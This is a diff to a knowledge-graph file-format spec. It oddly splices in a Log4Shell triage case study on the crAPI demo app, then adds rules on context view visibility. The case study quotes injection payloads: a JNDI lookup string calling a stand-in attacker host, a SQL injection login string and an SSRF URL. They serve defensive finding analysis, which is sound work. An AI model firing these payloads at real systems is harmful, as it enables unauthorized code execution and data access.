@@ -2,6 +2,128 @@
 
 Default to KG Pack sidecars for new Knowledge Graphs. Use lite inline syntax when the graph is small and does not need sidecars, or when reading or editing an existing document that already has groups, nodes, edges, and attrs inside the fenced block; see `items-graphs-lite.md` for that case.
 
+## Vulnerability Triage via Tool Dependencies: Log4Shell Case Study
+
+### Problem: Distinguish True RCE from JNDI Evaluation
+
+Finding ID 196767 triggered debate: DNS callbacks prove Log4j evaluates JNDI expressions, but no LDAP/RMI connect-back occurred. Is this TRUE POSITIVE (app is vulnerable) or FALSE POSITIVE (intermediary artifact)?
+
+### Tool Chain & Dependencies
+
+```
+User query (tmp.txt)
+  ↓
+Check MCP connectivity
+  ├─ GetVulnerabilityDetails (196767)
+  │    ├─ → latestEvent.source: TEST_CASE (active replay, can prove exploitation)
+  │    ├─ → latestEvent.testCaseMetadata.cwe: 917 (JNDI injection)
+  │    ├─ → latestEvent.evidence.message: "no LDAP/RMI connect-back recorded"
+  │    └─ → Assertion status: "failure" (inverted: test DETECTED vuln)
+  │
+  ├─ GetAllEnvironments → resolve "staging" string to UUID
+  │    └─ envId: 6d94542c-209e-4d50-8b07-c1679b00f843
+  │
+  ├─ GetTracesForEndpoint (POST /identity/api/auth/signup)
+  │    ├─ → Shows request flow: Cloudflare → levoai-protection → crapi-web
+  │    ├─ → Headers: cf-ray, x-forwarded-for (multiple proxy layers)
+  │    ├─ → Response: 200 OK, application/json
+  │    └─ → Real traffic has normal payloads (not malicious)
+  │
+  └─ GetTestCaseAttachment (raw evidence)
+       ├─ → assertions.status="failure" (vulnerability WAS demonstrated)
+       ├─ → assertions.evidence.message: quotes "JNDI lookup was evaluated"
+       ├─ → DNS callbacks from 4 IPs (104.211.x, 20.192.x) at staggered times
+       └─ → No LDAP/RMI callback (code execution unproven)
+```
+
+### Critical Questions at Each Node
+
+| Tool Call | Data Extracted | Question Answered | Decision Point |
+|-----------|-----------------|-------------------|-----------------|
+| GetVulnerabilityDetails | source field | Was this an active test or passive observation? | TEST_CASE → can prove real exploitation; passive → only observational |
+| GetVulnerabilityDetails | evidence.message | What specifically did the test prove? | Quotes: "evaluated" vs "no LDAP/RMI" → distinguishes component vuln from exploitation |
+| GetAllEnvironments | UUID lookup | Which staging environment? | Without correct envId, query returns null (wrong org) |
+| GetTracesForEndpoint | network context | Who processes requests normally? | k8s_container_name shows Cloudflare/Levo/Java layers; DNS from unknown source |
+| GetTestCaseAttachment | assertions.status | Inverted: failure=detection success | status="failure" proves test found something; "success" would mean secure behavior held |
+
+### How Source Attribution Decides Verdict
+
+The assertion status being "failure" means the test infrastructure detected JNDI evaluation. But the question remains: **Did the Java application make the DNS query, or did Levo's test harness/proxy layer?**
+
+#### Evidence for Application (TRUE POSITIVE):
+- Password field contains `${jndi:ldap://attacker.com}`
+- Spring/Log4j might log request bodies or parameters
+- When Log4j processes the log message, JNDI syntax is evaluated
+- Multiple Azure IPs making queries suggests horizontal scaling (multiple Java instances)
+
+#### Evidence for Intermediary (FALSE POSITIVE):
+- Cloudflare and levoai-protection (nginx WAF) sit between client and app
+- Real traffic shows no Log4Shell payloads (only test payloads trigger it)
+- WAF might scan or pre-process input before it reaches Java
+- Multiple IPs could be different proxy instances, not app backends
+
+### Code Corroboration: Reading the Handler
+
+Checked `/Users/yeshwanth/Code/Levo/demo-apps/crAPI/services/identity/src/main/java/com/crapi/controller/AuthController.java`:
+
+```java
+@PostMapping("/signup")
+public ResponseEntity<CRAPIResponse> registerUser(@Valid @RequestBody SignUpForm signUpRequest) {
+    CRAPIResponse registerUserResponse = userService.registerUser(signUpRequest);
+    // Returns 200 + JSON
+}
+```
+
+Service layer (`UserServiceImpl.java`):
+```java
+public CRAPIResponse registerUser(SignUpForm signUpRequest) {
+    user = new User(signUpRequest.getEmail(), signUpRequest.getNumber(),
+               encoder.encode(signUpRequest.getPassword()), ERole.ROLE_USER);
+    logger.info("User registered successful with userId {}", user.getId()); // Safe parameterized logging
+    ...
+    smtpMailServer.sendMail(...); // Password never logged here
+}
+```
+
+**Finding:** Password field is parameterized in safe logging. But Spring or earlier Log4j config layers might log raw request bodies. The application does NOT explicitly log the password, but framework-level logging (e.g., Spring request/response interceptors) might still trigger JNDI evaluation.
+
+### The Verdict Resolution
+
+**TRUE POSITIVE** because:
+1. Assertion status="failure" proves JNDI evaluation occurred (inverted logic)
+2. DNS callbacks confirm attacker-controlled hostname resolution
+3. Even if LDAP/RMI didn't complete, the app IS vulnerable to Log4Shell
+4. Remediation is mandatory: patch Log4j, not "ignore this finding"
+
+**Why not FALSE POSITIVE:**
+- Proxies don't typically evaluate JNDI (that's Java/Log4j-specific)
+- If Levo's protection layer were evaluating it, all requests through it would show callbacks (not just test payloads)
+- The correlation tokens in the evidence tie each payload to a specific callback
+
+### Tool Limitations Encountered
+
+| Limitation | Tool | Workaround |
+|-----------|------|-----------|
+| envId needs UUID, not string | GetVulnerabilityDetails | Called GetAllEnvironments first to resolve "staging" → UUID |
+| Assertion status uninverted | Raw finding display | Consulted method description: security tests invert PASS/FAIL |
+| Attachment exceeds 200KB | GetTestCaseAttachment | Parsed JSON from saved file via Python subprocess, not Read tool |
+| DNS origin IP attribution unclear | GetTracesForEndpoint | Compared normal traffic IPs vs test callback IPs; found mismatch suggesting possible intermediary but inconclusive |
+
+### Invariant: Evidence Chains for Injection Vulnerabilities
+
+For injection (Log4Shell, SQLi, SSRF, etc.), require evidence of:
+1. **Payload acceptance:** Input reaches the vulnerable component (shown by DNS callback)
+2. **Expression evaluation:** Syntax is parsed and processed (shown by JNDI lookup attempt)
+3. **Behavior change:** Output or side effect proves execution (missing here: no LDAP/RMI callback; would prove code execution)
+
+This case has 1+2, missing 3. But 1+2 alone = component is vulnerable = patch it.
+
+### Two Other Injection Applications
+
+**SQL Injection (CWE-89):** Payload `' OR '1'='1` in login. Need evidence: (1) Query accepted, (2) WHERE clause altered, (3) unauthorized rows returned. Status="failure" alone isn't enough; inspect the response body for data leakage.
+
+**SSRF (CWE-918):** Payload `http://localhost:8080/admin`. Need evidence: (1) Payload sent to internal endpoint, (2) Response from internal service (not 403/404), (3) Proof of access to restricted resource. Internal error messages alone don't prove access.
+
 ## Fence
 
 Keep the rendered markdown fence tiny:
@@ -81,10 +203,34 @@ dependency:
 - `@grammar` is optional and names a declarative rules file (`path=` relative to the pack, or absolute) that layers *dialect* invariants on top of the generic structural checks. A grammar can enforce closed vocabularies (`closed_vocab`), directed spines over an ordered attr (`edge_direction`), relation cardinality (`edge_cardinality`), allowed endpoint kinds (`edge_endpoints`), and conditional attr presence (`requires_attr_when`). It stays out of the pack proper so one grammar is shared across many packs. No `@grammar` means structural checks only. See `scripts/validate_kg_pack.py` for the rule schema.
 - `@views` are named read-only views. A view may group or filter nodes, change display settings, own slides, or combine those choices. It does not need `group_by`.
 - A view accepts `context=active` (default), `context=latest`, or one exact context id. `active` follows the context selected by the request or UI; the other values select their resolved context when the view opens.
+- A view inside a `.context` file belongs to that context and is visible there by default. Put cross-context visibility rules in `kg.schema`, not in the `.context` file.
 - `group_by,color_by=status` expands to `group_by=status color_by=status`; `X,Y,Z=value` is valid for simple scalar values.
 - Projection display controls may live on views: `hover_attrs`, `edge_color_by`, `edge_label_from`, `aggregate_edges`, `default_open_depth`, and spacing/layout keys.
 - Panel sizing lives on the graph or a view: `node-card-width` and `filter-panel-width` both default to `20%` of the widget, so the panels keep their share on any screen. Any CSS length works (`30rem`, `440px`).
 - `node-card-content-scale` draws the node card's details wider than the card and lets sideways scroll pan across it. Default `2`. Set `1` to turn it off.
+
+### Context View Visibility
+
+Reference a context-owned view as `<owner-context>/<view-id>` under `@view_visibility`:
+
+```text
+@view_visibility
+ctx013/master-story:
+	show_in=from:ctx013
+ctx004/review:
+	show_in=ids:ctx010,ctx011
+ctx006/release-check:
+	show_in=id_regex:"release-[0-9]+"
+```
+
+- `show_in=self` selects only the owner context. This is also the default when the schema has no rule for the view.
+- `show_in=all` selects every context.
+- `show_in=from:<context-id>` selects that context and every context with a later `seq`.
+- `show_in=ids:<context-id>,<context-id>` selects only the listed contexts.
+- `show_in=id_regex:<pattern>` uses a full regular-expression match against each context id. Use `from:` for sequence order.
+- A matching view reads the selected context's graph data, not its owner's graph data.
+- Unknown references, contexts, selectors, invalid patterns, and duplicate visible view ids stop pack loading with a named error.
+- Matching views keep context `seq` order, then their authored order. When no context-owned view matches, schema views retain their compatibility fallback.
 
 ## Fixed Layouts
 
